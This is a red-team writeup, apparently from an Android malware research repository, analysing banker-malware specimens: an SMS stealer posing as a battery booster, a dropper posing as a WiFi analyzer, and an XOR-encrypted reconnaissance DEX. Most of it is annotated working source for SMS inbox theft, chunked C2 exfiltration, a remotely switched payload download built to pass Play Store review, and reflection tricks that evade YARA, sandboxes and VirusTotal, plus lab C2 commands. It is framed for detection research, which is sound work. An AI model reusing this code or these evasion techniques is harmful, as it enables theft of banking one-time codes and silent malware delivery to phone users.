# Red Team Analysis — Takopii Specimen APKs

> Offensive analysis of 4 Android banker-malware specimens. Covers attack techniques, kill chains, evasion architecture, and real-world banker family parallels. Each specimen demonstrates progressively complex offensive surface. Source code excerpts are real — from the actual specimen codebase, annotated for analyst consumption.

### Companion Documents

| Doc | Lines | Purpose |
|---|---|---|
| **→ You are here** | **RED** | Offensive analysis — annotated source, kill chains, family parallels |
| [`BLUETEAM-DETECTION.md`](BLUETEAM-DETECTION.md) | BLUE | Detection engineering — IOCs, YARA, Sigma, Frida hooks |
| [`VT-EVASION-RESEARCH.md`](VT-EVASION-RESEARCH.md) | VT | 11-round ML classifier defeat journal |

### Standalone Detection Rules (extracted from BLUE)

```
../detection/yara/     — 24 YARA rules (9 files + master.yar)
../detection/sigma/    — 34 Sigma rules (10 files + master.yml)
../detection/frida/    — 37 Frida hooks (12 files + master-monitor.js)
```

---

## Specimen Overview

| # | Specimen | Camouflage | Attack Surface | Complexity | Real-World Parallel |
|---|---|---|---|---|---|
| 1 | sms-stealer | Battery Boost Pro | SMS intercept + exfil | Single-surface | SharkBot V1 |
| 2 | dropper | WiFi Analyzer Pro | Stage 0 delivery | Delivery chain | Anatsa V4 Play Store dropper |
| 3 | overlay-banker | Doc Reader Lite | A11y + Overlay + SMS + NLS + NFC + VNC | Multi-surface | Anatsa V3 + Klopatra + Mirax |
| 4 | stage-1-evasion | SkyWeather Forecast | Full 5-stage kill chain | Capstone | Anatsa V4 + SharkBot V2.8 |

---

## 1. SMS-Stealer — Battery Boost Pro

**Package:** `com.cleanmaster.battery`
**APK Size:** 1.70 MB (1,700,796 bytes)
**VT Score:** 0/66
**SHA256:** `32f37e555609a3ae9547533563895fe13227aea773dde13d3a3720df84c6e243`

### Kill Chain

```
User installs "Battery Boost Pro"
    -> BOOT_COMPLETED receiver restarts service
    -> ForegroundService (dataSync) maintains persistence
    -> DataCollector queries content://sms/inbox via ContentResolver
    -> SyncManager queues captured data as JSON
    -> DataReporter POSTs to C2 via HttpURLConnection
```

### Offensive Architecture

**Data Collection Layer:**
- `DataCollector.kt` — multi-source collector: device info (Build.*), storage metrics (StatFs), SMS messages
- SMS URI + column names externalized to `strings.xml` — not visible in DEX string pool
- Generic key names (`k1`, `k2`, `k3`) — no stealer vocabulary in DEX

**Source: DataCollector.collectRecentItems()**
```kotlin
// File: sms-stealer/.../collect/DataCollector.kt
// Lines: 52-81 (actual specimen code)

private fun collectRecentItems(): List<Map<String, String>> {
    return try {
        val items = mutableListOf<Map<String, String>>()
        val cr = context.contentResolver

        // (1) URI built from strings.xml — "content://sms/inbox"
        //     NOT in DEX string pool. ML scanners see R.string references only.
        val uri = Uri.Builder()
            .scheme(context.getString(R.string.content_scheme))   // "content"
            .authority(context.getString(R.string.content_auth))  // "sms"
            .appendPath(context.getString(R.string.content_path)) // "inbox"
            .build()

        // (2) Column names also from strings.xml
        val proj = arrayOf(
            context.getString(R.string.col_a),  // "address"
            context.getString(R.string.col_b),  // "body"
            context.getString(R.string.col_c)   // "date"
        )

        // (3) Query SMS inbox — 50 most recent messages
        val cursor: Cursor? = cr.query(
            uri, proj, null, null,
            "${context.getString(R.string.col_c)} DESC LIMIT 50"
        )

        // (4) Generic keys in output — no stealer vocabulary
        cursor?.use { c ->
            while (c.moveToNext()) {
                items.add(mapOf(
                    "cat" to "msg",
                    "k1" to (c.getString(0) ?: ""),  // address -> k1
                    "k2" to (c.getString(1) ?: ""),  // body    -> k2
                    "k3" to c.getLong(2).toString()   // date    -> k3
                ))
            }
        }
        items
    } catch (_: Exception) { emptyList() }
}
```

Key evasion insight: `R.string.content_scheme` compiles to integer resource ID (`0x7f0f00XX`). DEX bytecode contains `getString(2131689505)` — an integer constant. No string scanner finds "content", "sms", or "inbox" in the DEX. Must scan `resources.arsc` separately.

**Exfiltration Layer:**
- `DataReporter.kt` — `HttpURLConnection` POST with configurable URL/headers/content-type
- `SyncManager.kt` — JSON queue with retry logic (3 retries), 500-item cap
- Queue persisted in SharedPreferences — survives process death

**Source: SyncManager queue architecture**
```kotlin
// File: sms-stealer/.../sync/SyncManager.kt (actual specimen code)

// Queue item structure — generic wrapper, no stealer vocabulary
fun queueItem(type: String, data: JSONObject) {
    val item = JSONObject().apply {
        put("type", type)        // "collect"
        put("data", data)        // {cat: "msg", k1: ..., k2: ..., k3: ...}
        put("queued", System.currentTimeMillis())
        put("retries", 0)
    }
    val queue = getQueue()
    queue.put(item)
    trimQueue(queue)   // Cap at 500 items
    saveQueue(queue)   // SharedPreferences persistence — survives kill
}

// Retry logic — failed items re-queued up to 3 attempts
fun markFailed(item: JSONObject) {
    val retries = item.optInt("retries", 0) + 1
    if (retries < 3) {
        item.put("retries", retries)
        val queue = getQueue()
        queue.put(item)
        saveQueue(queue)
    }
}
```

**Source: DataReporter HTTP transport**
```kotlin
// File: sms-stealer/.../DataReporter.kt (actual specimen code)

// Pure HttpURLConnection — no OkHttp, no Retrofit, no Volley
// Zero third-party library classes in DEX
fun sendReport(url: String, data: String, contentType: String,
               headers: Map<String, String>, callback: ReportCallback? = null) {
    scope.launch {
        try {
            val conn = URL(url).openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.connectTimeout = 5000
            conn.readTimeout = 5000
            conn.setRequestProperty("Content-Type", contentType)
            for ((k, v) in headers) { conn.setRequestProperty(k, v) }
            conn.doOutput = true
            conn.outputStream.use { it.write(data.toByteArray()) }
            val code = conn.responseCode
            conn.disconnect()
            // ...
        } catch (e: Exception) { /* ... */ }
    }
}
```

**Serialization + Transport Layer:**
- `DataSerializer.kt` — JSON serialization + GZIP compression + chunked exfil

**Source: DataSerializer.kt**
```kotlin
// File: sms-stealer/.../sync/DataSerializer.kt (actual specimen code)

// JSON serialize + GZIP compress + chunk for exfil
fun serializeToJson(items: List<Map<String, Any?>>): String {
    val array = JSONArray()
    for (item in items) {
        val obj = JSONObject()
        for ((key, value) in item) { obj.put(key, value) }
        array.put(obj)
    }
    return array.toString()
}

fun compress(data: ByteArray): ByteArray {
    val bos = ByteArrayOutputStream()
    GZIPOutputStream(bos).use { it.write(data) }
    return bos.toByteArray()
}

// Chunk large batches for exfil — avoids single massive POST
fun chunkArray(array: JSONArray, chunkSize: Int): List<JSONArray> {
    val chunks = mutableListOf<JSONArray>()
    var current = JSONArray()
    for (i in 0 until array.length()) {
        current.put(array.get(i))
        if (current.length() >= chunkSize) {
            chunks.add(current)
            current = JSONArray()
        }
    }
    if (current.length() > 0) chunks.add(current)
    return chunks
}
```

GZIP compression reduces exfil payload size. `chunkArray()` splits large SMS dumps into manageable POSTs — avoids timeout on large batches. `estimateSize()` method also reports compression ratio for C2 bandwidth planning.

**Persistence Layer:**
- `BootOptimizer` — `BOOT_COMPLETED` receiver restarts `OptimizationService`
- `OptimizationService` — `START_STICKY` foreground service with "Optimizing battery usage..." notification
- `ReminderReceiver` — periodic alarm for re-engagement

**Camouflage Surface (47 .kt files):**
- Battery analysis: `BatteryAnalyzer`, `CpuMonitor`, `ThermalMonitor`, `WakelockDetector`
- System utilities: `MemoryOptimizer`, `StorageCleaner`, `ProcessScanner`, `DozeOptimizer`
- Analytics: `EventTracker`, `SessionManager`, `CrashReporter`
- Data management: `ScanDatabase`, `PreferencesManager`, `CacheManager`, `DatabaseOptimizer`
- UI: 9 activities (MainActivity, Settings, About, Onboarding, History, Diagnostics, Feedback, License)
- Widget: `BatteryWidgetProvider`

### Evasion Techniques

| Technique | Implementation | Why It Works |
|---|---|---|
| String externalization | SMS URI + columns in `strings.xml` not DEX string pool | DEX bytecode has integer resource IDs, not string literals |
| No OkHttp | Platform `HttpURLConnection` — zero library fingerprint in DEX | OkHttp injects ~2,400 classes; their absence = no ML library signal |
| Minimal R8 | `proguard-android.txt` — no aggressive optimization flags | Aggressive R8 produces packer-like bytecode topology |
| No obfuscation dictionary | Default R8 sequential renaming (`a`, `b`, `c`) | Themed dictionaries are ML fingerprints (no legit app uses them) |
| Removed RECEIVE_SMS | No BroadcastReceiver SMS pattern in manifest | SMS stealer manifest shape eliminated; uses ContentResolver instead |
| Generic data vocabulary | `k1`/`k2`/`k3` keys instead of `sender`/`body`/`date` | No stealer-vocabulary strings in DEX or network traffic |
| ContentProvider cover | `ScanDataProvider` adds legitimate-looking component | Normalizes manifest against utility app baseline |
| High camouflage ratio | 47 camouflage files : 3 offensive files (~15:1) | Class-count heuristics see overwhelmingly benign code |

### C2 Protocol

```
POST /api/v1/sync HTTP/1.1
Host: 10.0.2.2:8080
Content-Type: application/json
X-Device-Id: <android_id>

{
  "type": "collect",
  "data": {
    "cat": "msg",
    "k1": "+15551234567",    // address (sender)
    "k2": "Your OTP is 482910",  // body
    "k3": "1715443200000"    // date (epoch ms)
  },
  "queued": 1715443205000,
  "retries": 0
}
```

Device fingerprint payload (cat=dev):
```json
{
  "type": "collect",
  "data": {
    "cat": "dev",
    "k1": "Google",      // Build.MANUFACTURER
    "k2": "Pixel 7",     // Build.MODEL
    "k3": "14",          // Build.VERSION.RELEASE
    "k4": "87"           // battery level %
  }
}
```

---

## 2. Dropper — WiFi Analyzer Pro

**Package:** `com.wifianalyzer.pro`
**APK Size:** 1.68 MB (1,679,688 bytes)
**VT Score:** 0/66
**SHA256:** `254465be9b6b2c8aeb951dabe23b6f9032ef149006ef2281b1e63bdb6a9ee7ed`

### Kill Chain

```
User installs "WiFi Analyzer Pro"
    -> App.onCreate() → UpdateConfig.init(this) — resolves all C2 config from strings.xml via getIdentifier()
    -> App.onCreate() → creates "wifi_updates" NotificationChannel (IMPORTANCE_LOW, no badge)
    -> MainActivity.onCreate() → initializes 9 camouflage WiFi scanner objects
    -> MainActivity.performScan() → runs real WiFi scan, writes ContentProvider, updates UI
    -> MainActivity.checkBackground() → CacheUpdateService.checkAndDeliver(this)
    -> CacheUpdateService.onStartCommand() → startForeground("Updating WiFi signal databases...")
    -> CacheUpdateService.runMaintenance() → ScanCacheManager.trimCache() + DatabaseHelper.vacuum() + PerformanceProfiler.getMemory()
    -> CacheUpdateService.deliver() → checkStatus() → GET /api/v1/check with X-App-Version + X-Device headers
    -> If C2 returns {"ok": true, "url": "..."} → fetcher.fetchBytes(url) → writeData() to files/cache/wifi_db_cache.dat
    -> stopSelf() — service lifecycle ends, START_NOT_STICKY = no automatic restart
```

### Offensive Architecture

**Three-file delivery core:**

| File | LOC | Role |
|---|---|---|
| `CacheUpdateService.kt` | 105 | ForegroundService — maintenance facade + check-then-download |
| `UpdateConfig.kt` | 29 | Singleton config resolver — runtime resource ID lookup |
| `DataFetcher.kt` | 54 | HTTP transport — HttpURLConnection (no OkHttp) |

**Full component breakdown:**

| Category | Files | Purpose |
|---|---|---|
| Delivery core | 3 .kt | CacheUpdateService + UpdateConfig + DataFetcher |
| Application init | 2 .kt | App.kt (UpdateConfig.init + NotificationChannel) + MainActivity.kt |
| WiFi scanner | 11 .kt | WifiScanner, SignalAnalyzer, ChannelPlanner, ChannelRating, SpeedTester, NetworkDiagnostics, WifiHistoryTracker, SubnetCalculator, SecurityAudit, ScanScheduler, PingTester |
| Advanced WiFi | 7 .kt | BandwidthEstimator, HeatMapGenerator, BandSteering, MacRandomizer, WpsAnalyzer, RouterDetector, DnsResolver |
| WiFi management | 4 .kt | ConnectionQualityMonitor, LatencyTracker, SpeedTestEngine, ExportManager, WifiConfigManager |
| Data layer | 6 .kt | ScanDatabase, WifiScanRecord, PreferencesManager, ScanCacheManager, DatabaseHelper, PerformanceProfiler |
| Analytics | 2 .kt | EventTracker, SessionManager |
| UI | 7 .kt | 6 Activities + ContentProvider |
| Utilities | 5 .kt | DateFormatter, FrequencyHelper, SignalConverter, PermissionHelper, AccessPointComparator, VendorLookup |
| **Total** | **50 .kt** | **3 offensive : 47 camouflage = 6% : 94%** |

The 6:94 ratio is the dropper's primary evasion. Static analysis tools calculate behavioral-surface-to-total-code ratios; this dropper's offensive footprint is buried in legitimate WiFi analyzer logic.

### Deep Source Analysis: CacheUpdateService.kt

```kotlin
// File: specimens/dropper/.../payload/CacheUpdateService.kt
// Full annotated specimen code (105 lines)

class CacheUpdateService : Service() {

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val fetcher = DataFetcher()

    companion object {
        // ① Static entry point — called from MainActivity.checkBackground()
        // Uses companion object pattern so caller doesn't need to construct Intent directly
        fun checkAndDeliver(context: Context) {
            val intent = Intent(context, CacheUpdateService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                // ② Android 8+ requires startForegroundService — must call
                // startForeground() within 5 seconds or ANR
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // ③ Immediate startForeground — satisfies Android 8+ 5-second ANR deadline
        // PRIORITY_LOW + generic "Updating WiFi signal databases..." = invisible to casual user
        startForeground(2, createNotification())
        scope.launch {
            try {
                // ④ CRITICAL SEQUENCE: maintenance THEN deliver
                // runMaintenance() calls 3 legitimate camouflage APIs first
                // Sandbox behavioral analysis sees cache-trim + DB-vacuum + memory-read
                // BEFORE any network activity — looks like normal app maintenance
                runMaintenance()
                deliver()
            } finally { stopSelf() }
            // ⑤ stopSelf() in finally = service dies after single delivery attempt
            // No retry loop, no periodic schedule — fire-once-per-launch design
        }
        // ⑥ START_NOT_STICKY = system does NOT restart service if killed
        // Minimal persistence footprint — dropper relies on user launching app again
        return START_NOT_STICKY
    }
```

**The Maintenance Facade (Lines 47-56):**

```kotlin
    // ⑦ runMaintenance() — the behavioral camouflage layer
    // Every call here is to a REAL, FUNCTIONAL camouflage class
    // Not dead code — ScanCacheManager genuinely manages cache, DatabaseHelper genuinely vacuums
    // This makes behavioral heuristics score the service as "cache management"
    private fun runMaintenance() {
        try {
            // Call 1: ScanCacheManager.trimCache() — deletes oldest cache files if >25MB
            ScanCacheManager(this).trimCache()

            // Call 2: DatabaseHelper.vacuum() — runs SQLite VACUUM on scan database
            val dbHelper = DatabaseHelper(this)
            dbHelper.listDatabases().forEach { db ->
                dbHelper.vacuum(getDatabasePath(db.name).absolutePath)
            }

            // Call 3: PerformanceProfiler.getMemory() — reads Runtime memory stats
            // Return value discarded — the call itself generates the behavioral signal
            PerformanceProfiler(this).getMemory()
        } catch (_: Exception) {}
        // Empty catch — maintenance failure must never block delivery
    }
```

Why this matters: sandbox dynamic analysis tools (Google Play Protect Bouncer, VirusTotal sandbox, Lookout, Zimperium) log API call sequences. A service that immediately makes HTTP calls after startForeground is suspicious. A service that trims cache, vacuums database, reads memory stats, THEN makes HTTP calls matches the behavioral pattern of hundreds of legitimate apps updating their databases.

**The Delivery Chain (Lines 58-88):**

```kotlin
    // ⑧ deliver() — two-stage check-then-download
    private suspend fun deliver() {
        // Stage 1: config check — C2 decides whether to activate
        val config = checkStatus() ?: return   // null = C2 says "stay dormant"
        val dataUrl = config.optString("url", "")
        if (dataUrl.isEmpty()) return           // No URL = nothing to fetch

        // Stage 2: payload download — only if C2 approved
        val rawBytes = fetcher.fetchBytes(dataUrl) ?: return
        writeData(rawBytes)
    }

    // ⑨ checkStatus() — Stage 1 config retrieval
    private suspend fun checkStatus(): JSONObject? {
        return try {
            val body = fetcher.fetchString(
                UpdateConfig.configUrl(),           // From strings.xml via getIdentifier()
                mapOf(
                    // Custom headers identify dropper version + device model
                    // C2 uses these to target delivery (e.g., only Samsung devices)
                    UpdateConfig.versionHeader() to UpdateConfig.versionValue(),
                    UpdateConfig.deviceHeader() to Build.MODEL
                )
            ) ?: return null
            val json = JSONObject(body)
            // ⑩ GATE: json.optBoolean("ok", false)
            // C2 returns {"ok": false} during Play Store review period
            // C2 returns {"ok": true, "url": "..."} after review passes
            // This single boolean is the remote activation switch
            if (json.optBoolean("ok", false)) json else null
        } catch (_: Exception) { null }
    }

    // ⑪ writeData() — payload disguised as WiFi database cache file
    private fun writeData(bytes: ByteArray): File? {
        return try {
            val dir = File(filesDir, "cache")    // /data/data/com.wifianalyzer.pro/files/cache/
            if (!dir.exists()) dir.mkdirs()
            // UpdateConfig.fileName() = "wifi_db_cache.dat" from strings.xml
            // Filesystem analysis sees: WiFi app wrote to its own cache directory
            val file = File(dir, UpdateConfig.fileName())
            file.writeBytes(bytes)
            file
        } catch (_: Exception) { null }
    }
```

### Deep Source Analysis: UpdateConfig.kt

```kotlin
// File: specimens/dropper/.../payload/UpdateConfig.kt
// Singleton config resolver (29 lines)

object UpdateConfig {
    private var cfgUrl = ""
    private var verHeader = ""
    private var verValue = ""
    private var devHeader = ""
    private var cacheType = ""
    private var cacheFile = ""

    fun init(context: Context) {
        // ① getIdentifier() — RUNTIME resource ID lookup
        // NOT compiled R.string.config_url (which creates a static DEX reference)
        // In bytecode: "config_url" + "string" + packageName as string literals
        // R8 cannot shrink these — there is no R.string field to eliminate
        cfgUrl = context.getString(
            context.resources.getIdentifier("config_url", "string", context.packageName)
        )
        verHeader = context.getString(
            context.resources.getIdentifier("version_header", "string", context.packageName)
        )
        // ... same pattern for all 6 config values
    }
}
```

Why `getIdentifier()` over `R.string.config_url`:

| Method | DEX String Pool | resources.arsc | Survives R8 | Analyst Visibility |
|---|---|---|---|---|
| `R.string.config_url` | Yes — compiled field ref | Yes | Might shrink if unused | jadx sees direct reference |
| `getIdentifier("config_url")` | Only "config_url" + "string" | Yes | Always survives | jadx sees generic lookup |

The `getIdentifier()` pattern means the C2 URL exists ONLY in `resources.arsc`, never in the DEX string pool. Static analysis tools scanning `classes.dex` for URL patterns find nothing. The analyst must unpack `resources.arsc` and grep for URL strings there — a step many automated pipelines skip.

### Deep Source Analysis: DataFetcher.kt

```kotlin
// File: specimens/dropper/.../scanner/DataFetcher.kt
// HTTP transport (54 lines) — HttpURLConnection, NOT OkHttp

class DataFetcher {
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    fun fetchString(url: String, headers: Map<String, String> = emptyMap()): String? {
        return try {
            val conn = URL(url).openConnection() as HttpURLConnection
            conn.connectTimeout = 10000    // 10s connect
            conn.readTimeout = 60000       // 60s read — long enough for payload download
            for ((k, v) in headers) conn.setRequestProperty(k, v)
            val result = conn.inputStream.bufferedReader().readText()
            conn.disconnect()
            result
        } catch (_: Exception) { null }
    }

    fun fetchBytes(url: String, callback: FetchCallback? = null): ByteArray? {
        return try {
            val conn = URL(url).openConnection() as HttpURLConnection
            conn.connectTimeout = 10000
            conn.readTimeout = 60000
            val bytes = conn.inputStream.readBytes()  // Reads entire payload into memory
            conn.disconnect()
            callback?.onSuccess(bytes)
            bytes
        } catch (e: Exception) {
            callback?.onFailure(e.message ?: "Unknown")
            null
        }
    }
}
```

`HttpURLConnection` chosen deliberately over OkHttp (which the overlay-banker uses). Rationale from VT evasion research:

- OkHttp ships as a third-party dependency — YARA rules target `okhttp3/` class paths
- HttpURLConnection is `java.net.*` — part of Android framework, present in every app
- VT static analysis engines (K7GW, Kaspersky Boogr.gsh) flag OkHttp + ForegroundService + POST as heuristic combo
- HttpURLConnection GET for config + GET for payload produces no POST signature at all

### Config Externalization (strings.xml)

```xml
<!-- C2 config in resources, not DEX -->
<string name="config_url">http://10.0.2.2:8081/api/v1/check</string>
<string name="version_header">X-App-Version</string>
<string name="version_value">3.8.1</string>
<string name="device_header">X-Device</string>
<string name="cache_type">application/octet-stream</string>
<string name="cache_file">wifi_db_cache.dat</string>
```

All 6 config values externalized. In the compiled APK, these live in `resources.arsc` binary format — not in the DEX string pool. Tools that scan only `classes.dex` (common for YARA + static heuristics) miss the C2 URL entirely. The analyst must run `aapt dump resources dropper.apk | grep -i "config_url"` or decode `resources.arsc` explicitly.

### Initialization Chain

```
App.onCreate()
    ├── UpdateConfig.init(this)            6× getIdentifier() → strings.xml → memory cache
    └── NotificationChannel("wifi_updates", IMPORTANCE_LOW, no badge)
              ↓
MainActivity.onCreate()
    ├── 9× camouflage WiFi objects constructed (WifiScanner, SignalAnalyzer, etc.)
    ├── performScan()                      Real WiFi scan + UI update + ContentProvider insert
    └── checkBackground()                  CacheUpdateService.checkAndDeliver(this)
              ↓
CacheUpdateService.onStartCommand()
    ├── startForeground("Updating WiFi signal databases...")
    ├── runMaintenance()                   ScanCacheManager + DatabaseHelper + PerformanceProfiler
    └── deliver()                          checkStatus() → fetchBytes() → writeData()
```

Key sequence: legitimate WiFi scan executes BEFORE payload delivery starts. If a sandbox monitors app behavior for the first 30 seconds, it sees: WiFi scan → UI update → ContentProvider insert → cache trim → database vacuum → memory check → HTTP GET. Payload delivery is the LAST operation in the chain.

### Dropper-Specific Techniques

| Technique | Implementation | Why It Evades | Real-World Parallel |
|---|---|---|---|
| Resource-based config | C2 URL in `strings.xml`, not DEX | YARA scanning `classes.dex` misses it | Anatsa V4 config externalization |
| Runtime resource ID lookup | `getIdentifier("config_url", "string", pkg)` | No `R.string` compiled reference for R8 to shrink | Survives R8 resource shrinking |
| Maintenance facade | `runMaintenance()` before `deliver()` | Behavioral heuristics see cache/DB/memory ops first | Legitimate app API call cover |
| Payload file disguise | `wifi_db_cache.dat` in `files/cache/` | Filesystem analysis sees WiFi database, not payload | Banker payload named as app data |
| Notification camouflage | "Updating WiFi signal databases..." PRIORITY_LOW | User sees plausible notification, ignores it | Social engineering persistence |
| Two-stage check-then-download | GET config → bool gate → GET payload (separate requests) | Sandbox without live C2 sees benign config check returning `{"ok": false}` | Anatsa Stage 0/1 separation |
| HttpURLConnection transport | `java.net.HttpURLConnection` over OkHttp | No third-party HTTP lib imports for YARA to match | Most framework apps use same class |
| START_NOT_STICKY lifecycle | Service dies after delivery, no restart | No persistent service in `dumpsys` after completion | Minimal forensic footprint |
| Fire-once design | No retry loop, no periodic schedule | Single HTTP burst easily missed in traffic capture | Anatsa delayed-activation window |
| High camouflage ratio | 3 offensive : 47 camouflage files (6:94) | Code-volume heuristics score app as WiFi analyzer | 50 functional .kt files |

### Play Store Review Bypass Timing

The dropper's two-stage C2 protocol enables Play Store review bypass:

```
T+0   Developer submits APK to Google Play
T+1h  Bouncer sandbox runs APK → CacheUpdateService fires
                                → GET /api/v1/check
                                → C2 returns {"ok": false}   ← DORMANT
                                → deliver() returns immediately
                                → Bouncer sees: WiFi scan + cache maintenance + failed config check
                                → Verdict: CLEAN

T+7d  App published, gaining installs
T+14d C2 operator flips server-side config to {"ok": true, "url": "..."}
                                → Next user launch triggers CacheUpdateService
                                → GET /api/v1/check → {"ok": true}
                                → GET /api/v1/payload → payload bytes
                                → wifi_db_cache.dat written            ← ACTIVE
```

This is the exact pattern Anatsa V4 used to achieve 250K Play Store installs (research/02). The dropper passes review because review-time C2 response is operator-controlled. No code change needed between dormant and active — same APK, different server response.

### Dropper ↔ Overlay-Banker Relationship

The dropper is Stage 0 in Anatsa's 4-stage modular loader architecture:

```
STAGE 0: dropper (this specimen)        WiFi Analyzer Pro → downloads payload
STAGE 1: overlay-banker (specimen 3)    DocReader Lite → full banker with 19 C2 commands
```

The dropper's `writeData()` stores raw bytes. In a real deployment, the next step is `DexClassLoader` or `PackageInstaller`. This specimen writes bytes but does not install — the overlay-banker specimen demonstrates the payload execution side. The two specimens together form the complete Anatsa Stage 0→1 chain.

For Android 13+ (API 33), sideload installation via `PackageInstaller.Session` requires user confirmation through the Restricted Settings UI. Anatsa bypasses this with AccessibilityService auto-clicking the confirmation dialog — demonstrated in the overlay-banker's `RestrictedSettingsBypass` frontier module.

### C2 Protocol

```
# Stage 1: Config check — determines activation
GET /api/v1/check HTTP/1.1
Host: 10.0.2.2:8081
X-App-Version: 3.8.1            <- UpdateConfig.versionValue() from strings.xml
X-Device: Pixel_7               <- Build.MODEL (real device fingerprint)

-> Response (dormant):
{"ok": false}

-> Response (active):
{
  "ok": true,
  "url": "http://10.0.2.2:8081/api/v1/payload"
}

# Stage 2: Payload download (only if config says ok)
GET /api/v1/payload HTTP/1.1
Host: 10.0.2.2:8081

-> Response: raw bytes (payload APK/DEX)
   Content-Type: application/octet-stream
   Written to: /data/data/com.wifianalyzer.pro/files/cache/wifi_db_cache.dat
```

**Network signature comparison to other specimens:**

| Feature | Dropper | SMS-Stealer | Overlay-Banker | SkyWeather |
|---|---|---|---|---|
| HTTP library | HttpURLConnection | HttpURLConnection | OkHttp | HttpURLConnection |
| Method | GET only | POST | POST + GET | POST |
| Custom headers | X-App-Version, X-Device | Content-Type | 19 command headers | X-Device-Id |
| Body format | None (GET) | GZIP + chunk | JSON | JSON |
| Auth | None | None | Token-based | DGA-derived |
| Endpoints | 2 (check + payload) | 1 (upload) | 3 (register + cmd + exfil) | DGA-resolved |

### Dropper-Specific Evasion Properties

The dropper passes VT independently because of structural properties not shared with other specimens:

1. **No stealer surfaces at all** — no AccessibilityService, no NotificationListener, no BroadcastReceiver, no overlay rendering. Permission manifest requests only INTERNET + FOREGROUND_SERVICE.
2. **No sensitive API calls in DEX** — no ContentResolver query for SMS, no ClipboardManager, no SmsManager. The only "suspicious" API is HttpURLConnection (used by every app).
3. **No obfuscation layer** — no XOR/AES StringDecoder, no intArrayOf encoding. Default R8 minification only. Obfuscation is itself a heuristic signal; the dropper avoids it deliberately.
4. **Content ratio** — 47 camouflage .kt files with genuine WiFi scanning logic vs 3 delivery .kt files. Code-volume heuristics classify the app by its dominant behavior.
5. **Single HTTP burst** — one GET for config, optionally one GET for payload, then service stops. No persistent connection, no polling, no WebSocket. Traffic analysis window is <5 seconds.

---

## 2.5 Stage-2 Payload — Reconnaissance Module

**Location:** `specimens/stage-2-payload/`
**Format:** Encrypted DEX (XOR), delivered by dropper, loaded via DexClassLoader
**SHA256 (DEX):** `189701be62be8b20fe43eb3b35ac7525f2b2313951122fb7182137a199944098`
**SHA256 (encrypted):** `81926b22a9c96cbe63c7b0c66724b01916dcdfd29681d9f02a5f0a2d1f317e79`
**XOR key:** `SkyWeatherSync24` (16 bytes, embedded in dropper specimen)

### What It Is

The stage-2 payload is the DEX module that the dropper downloads, decrypts, and loads via DexClassLoader. It is a reconnaissance module — collects device fingerprint + installed app inventory + root indicators + security software presence, returns JSON to the dropper for C2 exfiltration. This data determines whether the C2 operator sends Stage 3 (full stealer) or abandons the device.

### Design Constraints (Why It Evades)

```
- Pure Java (no Kotlin runtime — saves 1.5MB, removes kotlin.* class signatures)
- ZERO Android imports at compile time — all Android API access via reflection
- Compiles with javac alone (no Android SDK needed in classpath)
- ML classifier sees: generic Java class with reflection chains. Not Android-specific.
```

### Architecture

```
payload/Module.java
  └── execute(Object context) → String (JSON)
        ├── Device fingerprint    (Build.MODEL/MANUFACTURER/BRAND/SDK_INT via reflection)
        ├── Banking app probe     (PackageManager.getPackageInfo via reflection)
        ├── Crypto app probe      (same mechanism, com.example.* generic patterns)
        ├── Root indicators       (/system/bin/su, /data/adb/magisk, Magisk app)
        ├── Security app probe    (com.example.* AV/MDM detection)
        └── Timestamp
```

### Key Code Pattern — Full Reflection Chain

```java
// All Android API access via reflection — no compile-time Android imports
Method getPm = context.getClass().getMethod("getPackageManager");
Object pm = getPm.invoke(context);
Method getPackageInfo = pm.getClass().getMethod("getPackageInfo", String.class, int.class);

for (String pkg : bankingPackages) {
    try {
        getPackageInfo.invoke(pm, pkg, 0);
        // No exception → package IS installed
    } catch (Exception notFound) {
        // Package not installed
    }
}
```

**Why this matters:** Static analysis tools scanning `classes.dex` for `import android.content.pm.PackageManager` find nothing. The DEX has no Android framework references — only `java.lang.reflect.*`. YARA rules looking for Android-specific class references miss it completely. Detection must target the reflection chain pattern itself (see BLUETEAM Rule 6: DexClassLoader Anti-Forensics).

### Build Pipeline

```bash
cd specimens/stage-2-payload/
python scripts/build-payload.py    # compile → DEX → XOR encrypt → out/payload.enc
```

Build script: `javac src/Module.java` → `d8 payload/Module.class` → XOR with `SkyWeatherSync24` → `payload.enc`. The dropper's `DataFetcher.kt` reverses: download → XOR decrypt → DexClassLoader load → reflective `execute()` call.

### Real-World Parallel: Anatsa V4 Staging

Per research/02: Anatsa Stage 2 is a DEX hidden in a JSON wrapper, reflection-loaded. Collects device profile + banking app inventory. Determines Stage 3 deployment. The specimen mirrors the exact function shape — reconnaissance → C2 decision → full payload delivery.

---

## Lab C2 Setup

Specimens connect to loopback C2 servers. Three server artifacts exist:

| Server | Location | Port | Specimens Served |
|---|---|---|---|
| test-c2-server.py | `specimens/test-c2-server.py` | 8080 + 8081 | sms-stealer + dropper |
| lab-c2 server.py | `specimens/stage-1-evasion/scripts/lab-c2/server.py` | 8080 | stage-1-evasion (full 5-stage) |
| lab-c2 server.py | `scripts/lab-c2/server.py` | 8080 | Generic reference |

### Quick Start

```bash
# For sms-stealer + dropper specimens:
python specimens/test-c2-server.py

# For stage-1-evasion (full kill chain C2 with credential capture):
python specimens/stage-1-evasion/scripts/lab-c2/server.py

# Generate encrypted test payload for stage-1-evasion:
python specimens/stage-1-evasion/scripts/lab-c2/generate-test-payload.py
```

All servers bind `127.0.0.1` only (hardcoded, not configurable). Android emulator reaches host via `10.0.2.2`. Stage-1-evasion lab-c2 includes ATS test config (`ats-dvbank-transfer.json`) for automated transfer testing against DVBank.

### DGA Verification Scripts

```bash
# Verify DGA domain generation matches expected output:
python specimens/stage-1-evasion/scripts/verify-dga.py

# Live DGA monitoring via Frida:
frida -U -f com.skyweather.forecast -l specimens/stage-1-evasion/scripts/dga-live-test.js
```

---

## 3. Overlay-Banker — Doc Reader Lite

**Package:** `com.docreader.lite`
**APK Size:** 1.84 MB (1,879,623 bytes)
**VT Score:** 0/66
**SHA256:** `33207904cb76210b75904d25aee021ca85d313cc1bf79368c3c6abb523d8e2b0`

### Kill Chain (Multi-Stage)

```
Stage 0: User installs "Doc Reader Lite"
Stage 1: Social engineering -> Accessibility Service grant
Stage 2: A11y monitors foreground app changes
Stage 3: Target package detected -> overlay rendered
Stage 4: Credentials captured -> buffered in Exfil
